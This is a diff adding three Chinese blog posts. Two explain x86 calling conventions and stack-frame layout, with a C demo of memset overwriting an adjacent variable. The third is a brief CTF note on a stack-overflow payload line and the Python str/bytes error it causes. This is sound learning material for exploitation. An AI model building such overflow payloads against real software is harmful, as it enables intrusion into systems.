@@ -145,6 +145,309 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/17/%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/17/%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/" class="post-title-link" itemprop="url">栈基础知识2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-17 21:56:57" itemprop="dateCreated datePublished" datetime="2024-03-17T21:56:57+08:00">2024-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-19 21:11:11" itemprop="dateModified" datetime="2024-03-19T21:11:11+08:00">2024-03-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <hr>
+<h2 id="函数调用约定通常规定如下几方面内容："><a href="#函数调用约定通常规定如下几方面内容：" class="headerlink" title="函数调用约定通常规定如下几方面内容："></a>函数调用约定通常规定如下几方面内容：</h2><h3 id="1-函数参数的传递顺序和方式"><a href="#1-函数参数的传递顺序和方式" class="headerlink" title="\1) 函数参数的传递顺序和方式"></a>\1) 函数参数的传递顺序和方式</h3><p>   <strong>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</strong></p>
+<h3 id="2-栈的维护方式"><a href="#2-栈的维护方式" class="headerlink" title="\2) 栈的维护方式"></a>\2) 栈的维护方式</h3><p>   <strong>主调函数将参数压栈后调用 被调函数体，返回时需将 被压栈的参数 全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由 主调函数 负责完成，也可由 被调函数 负责完成。</strong></p>
+<h3 id="3-名字修饰-Name-mangling-策略"><a href="#3-名字修饰-Name-mangling-策略" class="headerlink" title="\3) 名字修饰(Name-mangling)策略"></a>\3) 名字修饰(Name-mangling)策略</h3><p>   <strong>又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</strong></p>
+<p>   <em><strong>若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</strong></em></p>
+<hr>
+<p><img src="https://ooo.0x0.ooo/2024/03/18/Ogk9tM.png" alt="image-20240318213236314"></p>
+<p> Windows下可直接在函数声明前添加关键字__stdcall、__<strong>cdecl</strong>或__fastcall等标识确定函数的调用方式，如int __stdcall func()。Linux下可借用函数<strong>attribute</strong> 机制，如int <strong>attribute</strong>((<strong>stdcall</strong>)) func()。</p>
+<h3 id="c-函数的缺省值："><a href="#c-函数的缺省值：" class="headerlink" title="c++函数的缺省值："></a><strong>c++函数的缺省值：</strong></h3><p><strong>c++中，定义函数的时候可以让最右边的连续若干个参数有缺省值，在调用函数的时候，如果不写相应位置的参数，则调用的参数就为缺省值。</strong></p>
+<p> 不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)。</p>
+<p> 此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误(报告被调函数未定义)。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line"><span class="number">2</span>     <span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="number">3</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">4</span>     <span class="function">type <span class="title">Func</span><span class="params">(type para)</span></span>;</span><br><span class="line"><span class="number">5</span> <span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line"><span class="number">6</span>     &#125;</span><br><span class="line"><span class="number">7</span> <span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p> 这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。</p>
+<p>x86函数参数传递方法：</p>
+<p>​    x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序(下标0<del>N-1)与函数参数声明顺序(Para1</del>N)一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。</p>
+<p><strong>栈帧地址</strong>未压入参数时为4(%ebp)</p>
+<h2 id="x86函数返回值传递方法"><a href="#x86函数返回值传递方法" class="headerlink" title="x86函数返回值传递方法"></a>x86函数返回值传递方法</h2><p>   函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时：</p>
+<p>   <strong>\1) 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在<em>EAX</em>寄存器中，调用方通过读取<em>EAX</em>获取返回值。</strong></p>
+<p>   <strong>\2) 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过<em>EAX+EDX</em>寄存器联合返回，其中<em>EDX</em>保存返回值高4字节，<em>EAX</em>保存返回值低4字节。</strong></p>
+<p>   <strong>\3) 若返回值为浮点类型(如float和double)，则通过<em>专用的协处理器浮点数寄存器栈的栈顶</em>返回。</strong></p>
+<p>   <strong>\4) 若返回值为结构体或联合体，则<em>主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。</em></strong></p>
+<p><strong>eg:函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以<em>引用型参数形式</em>传回返回值。</strong></p>
+<p><strong>具体步骤可能为：</strong></p>
+<p><strong>a.主调函数将显式的实参逆序入栈；</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&quot;逆序入栈&quot; 通常是指在将一系列元素入栈（push）到栈（stack）中时，这些元素按照它们原始顺序的逆序进入栈。也就是说，最后一个元素首先入栈，然后是倒数第二个元素，依此类推，直到第一个元素最后入栈。这样做通常是为了在后续的出栈（pop）操作中，元素能够以原始顺序出现。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；</strong></p>
+<p><strong>c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。</strong></p>
+<p>因此，在被调函数中完成返回值的赋值工作。****</p>
+<hr>
+<p>   <strong>注意:函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法(VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回)。而对于超过8字节的大结构体<em>，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数</em>；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值</strong>(这种方法允许你修改结构体的内容，但并不能直接返回一个全新的结构体。如果你需要返回一个全新的结构体，你可能需要动态分配内存，但这会带来额外的复杂性和责任)。</p>
+<hr>
+<p>   <strong>\5) 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</strong></p>
+<p>   <strong>函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</strong></p>
+<p>GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。</p>
+<p>在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/17/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/17/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1/" class="post-title-link" itemprop="url">栈溢出基础知识</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-17 21:38:48" itemprop="dateCreated datePublished" datetime="2024-03-17T21:38:48+08:00">2024-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-20 21:34:14" itemprop="dateModified" datetime="2024-03-20T21:34:14+08:00">2024-03-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="在汇编语言层面，"><a href="#在汇编语言层面，" class="headerlink" title="在汇编语言层面，"></a><strong>在汇编语言层面，</strong></h2><p><strong>这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，</strong></p>
+<p><strong>eg： mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</strong></p>
+<h2 id="在x86处理器中："><a href="#在x86处理器中：" class="headerlink" title="在x86处理器中："></a><strong>在x86处理器中：</strong></h2><p><strong>EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。</strong></p>
+<p><strong>ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；</strong></p>
+<p><strong>EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</strong></p>
+<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h2><p><strong>EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</strong></p>
+<hr>
+<p><strong>FP：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=frame&spm=1001.2101.3001.7020">frame</a> pointer 栈帧指针，每个进程的栈空间为一帧，FP指向 当前进程栈空间的 栈底。</strong></p>
+<p><strong>32位Windows，一个进程栈的默认大小是1M。</strong></p>
+<hr>
+<h3 id="每个未完成运行的函数占用一个独立的连续区域，称作栈帧-Stack-Frame-。"><a href="#每个未完成运行的函数占用一个独立的连续区域，称作栈帧-Stack-Frame-。" class="headerlink" title="每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。"></a>每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。</h3><p><strong>栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</strong></p>
+<h3 id="使用栈帧的一个好处："><a href="#使用栈帧的一个好处：" class="headerlink" title="使用栈帧的一个好处："></a>使用栈帧的一个好处：</h3><p><strong>使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</strong></p>
+<p><strong>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；</strong></p>
+<p><strong>ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</strong></p>
+<p><strong>称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp.</strong></p>
+<p> <strong>从图中可以看出，函数调用时入栈顺序为</strong><br>$$<br><strong>实参N<del>1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1</del>N</strong><br>$$<br><strong>其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。</strong></p>
+<p><strong>进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。</strong></p>
+<p><strong>此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。</strong></p>
+<p><strong>本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。</strong></p>
+<p><strong>ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</strong></p>
+<p> <strong>若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。</strong></p>
+<hr>
+<p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址&#x3D;tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</p>
+<p><img src="https://images0.cnblogs.com/i/569008/201405/271652449633815.jpg" alt="img"></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">//StackFrame.c</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="keyword">struct</span> <span class="title class_">Strt</span>&#123;</span><br><span class="line"> <span class="number">6</span>     <span class="type">int</span> member1;</span><br><span class="line"> <span class="number">7</span>     <span class="type">int</span> member2;</span><br><span class="line"> <span class="number">8</span>     <span class="type">int</span> member3;</span><br><span class="line"> <span class="number">9</span> &#125;;</span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span> <span class="meta">#<span class="keyword">define</span> PRINT_ADDR(x)     printf(<span class="string">&quot;&amp;&quot;</span>#x<span class="string">&quot; = %p\n&quot;</span>, &amp;x)</span></span><br><span class="line"><span class="number">12</span> <span class="function"><span class="type">int</span> <span class="title">StackFrameContent</span><span class="params">(<span class="type">int</span> para1, <span class="type">int</span> para2, <span class="type">int</span> para3)</span></span>&#123;</span><br><span class="line"><span class="number">13</span>     <span class="type">int</span> locVar1 = <span class="number">1</span>;</span><br><span class="line"><span class="number">14</span>     <span class="type">int</span> locVar2 = <span class="number">2</span>;</span><br><span class="line"><span class="number">15</span>     <span class="type">int</span> locVar3 = <span class="number">3</span>;</span><br><span class="line"><span class="number">16</span>     <span class="type">int</span> arr[] = &#123;<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line"><span class="number">17</span>     <span class="keyword">struct</span> <span class="title class_">Strt</span> tStrt = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">18</span>     <span class="built_in">PRINT_ADDR</span>(para1); <span class="comment">//若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span></span><br><span class="line"><span class="number">19</span>     <span class="built_in">PRINT_ADDR</span>(para2);</span><br><span class="line"><span class="number">20</span>     <span class="built_in">PRINT_ADDR</span>(para3);</span><br><span class="line"><span class="number">21</span>     <span class="built_in">PRINT_ADDR</span>(locVar1);</span><br><span class="line"><span class="number">22</span>     <span class="built_in">PRINT_ADDR</span>(locVar2);</span><br><span class="line"><span class="number">23</span>     <span class="built_in">PRINT_ADDR</span>(locVar3);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">PRINT_ADDR</span>(arr);</span><br><span class="line"><span class="number">25</span>     <span class="built_in">PRINT_ADDR</span>(arr[<span class="number">0</span>]);</span><br><span class="line"><span class="number">26</span>     <span class="built_in">PRINT_ADDR</span>(arr[<span class="number">1</span>]);</span><br><span class="line"><span class="number">27</span>     <span class="built_in">PRINT_ADDR</span>(arr[<span class="number">2</span>]);</span><br><span class="line"><span class="number">28</span>     <span class="built_in">PRINT_ADDR</span>(tStrt);</span><br><span class="line"><span class="number">29</span>     <span class="built_in">PRINT_ADDR</span>(tStrt.member1);</span><br><span class="line"><span class="number">30</span>     <span class="built_in">PRINT_ADDR</span>(tStrt.member2);</span><br><span class="line"><span class="number">31</span>     <span class="built_in">PRINT_ADDR</span>(tStrt.member3);</span><br><span class="line"><span class="number">32</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">33</span> &#125;</span><br><span class="line"><span class="number">34</span> </span><br><span class="line"><span class="number">35</span> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="number">36</span>     <span class="type">int</span> locMain1 = <span class="number">1</span>, locMain2 = <span class="number">2</span>, locMain3 = <span class="number">3</span>;</span><br><span class="line"><span class="number">37</span>     <span class="built_in">PRINT_ADDR</span>(locMain1);</span><br><span class="line"><span class="number">38</span>     <span class="built_in">PRINT_ADDR</span>(locMain2);</span><br><span class="line"><span class="number">39</span>     <span class="built_in">PRINT_ADDR</span>(locMain3);</span><br><span class="line"><span class="number">40</span>     <span class="built_in">StackFrameContent</span>(locMain1, locMain2, locMain3);</span><br><span class="line"><span class="number">41</span>     <span class="built_in">printf</span>(<span class="string">&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;</span>, locMain1, locMain2, locMain3);</span><br><span class="line"><span class="number">42</span>     <span class="built_in">memset</span>(&amp;locMain2, <span class="number">0</span>, <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="number">43</span>     <span class="built_in">printf</span>(<span class="string">&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;</span>, locMain1, locMain2, locMain3);</span><br><span class="line"><span class="number">44</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">45</span> &#125;</span><br><span class="line">StackFrame</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/20/Og7vZt.jpg" alt="img"></p>
+<p>函数调用以值传递时，传入的实参(locMain1<del>3)与被调函数内操作的形参(para1</del>3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p>
+<p>此外，”[locMain1,2,3] &#x3D; [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p>
+<p><strong>memset()函数介绍</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memset</span><span class="params">(<span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>解释：复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。</strong><br><strong>作用：是在一段内存块中填充某个给定的值，它是对较大的结构体或数组进行清零操作的一种最快方法</strong><br><strong>头文件：C中#include&lt;string.h&gt;，C++中#include<cstring></strong></p>
+<p>局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组&#x2F;结构体型的局部变量通常分配在栈内存中。</p>
+<p>若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p>
+<hr>
+<h2 id="函数调用时的具体步骤如下："><a href="#函数调用时的具体步骤如下：" class="headerlink" title="函数调用时的具体步骤如下："></a>函数调用时的具体步骤如下：</h2><p>   <strong>\1) 主调函数（caller）将被调函数（callee）所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</strong></p>
+<p>   <strong>注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</strong></p>
+<p>   <strong>\2) 主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</strong></p>
+<p>   <strong>\3) 若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</strong></p>
+<p>   <strong>\4) 被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</strong></p>
+<p>   <strong>\5) 被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</strong></p>
+<p>   <strong>\6) 一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</strong></p>
+<p>   <strong>\7) 恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</strong></p>
+<p>   <strong>\8) 被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</strong></p>
+<p>   <strong>\9) 主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</strong></p>
+<p>   *<em>步骤3与步骤4在函数调用之初常一同出现，统称为</em>函数序(prologue)<em>；步骤6到步骤8在函数调用的最后常一同出现，统称为</em>函数跋(epilogue)<em>。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</em>*</p>
+<hr>
+<p><strong>压栈</strong>(push)<strong>：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</strong>*</p>
+<p>   <strong>出栈</strong>(pop)<strong>：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。</strong></p>
+<p>   <strong>可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</strong></p>
+<p>   <strong>调用</strong>(call)<strong>：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</strong></p>
+<p>   <strong>离开</strong>(leave)<strong>： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</strong></p>
+<p>   <strong>返回</strong>(ret)<strong>：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</strong>*</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/15/%E5%88%B7%E9%A2%98%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%931-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/15/%E5%88%B7%E9%A2%98%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%931-1/" class="post-title-link" itemprop="url">刷题知识点总结1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-15 21:20:48 / 修改时间：21:21:36" itemprop="dateCreated datePublished" datetime="2024-03-15T21:20:48+08:00">2024-03-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>python3进行编译此条代码会出现报错：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br></pre></td></tr></table></figure>
+
+<p>报错信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;mex.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>  + p64(<span class="number">1853186401</span>)</span><br><span class="line">TypeError: can only concatenate <span class="built_in">str</span> (<span class="keyword">not</span> <span class="string">&quot;bytes&quot;</span>) to <span class="built_in">str</span></span><br></pre></td></tr></table></figure>
+
+<p>报错翻译——字符类型不匹配不能进行拼接。</p>
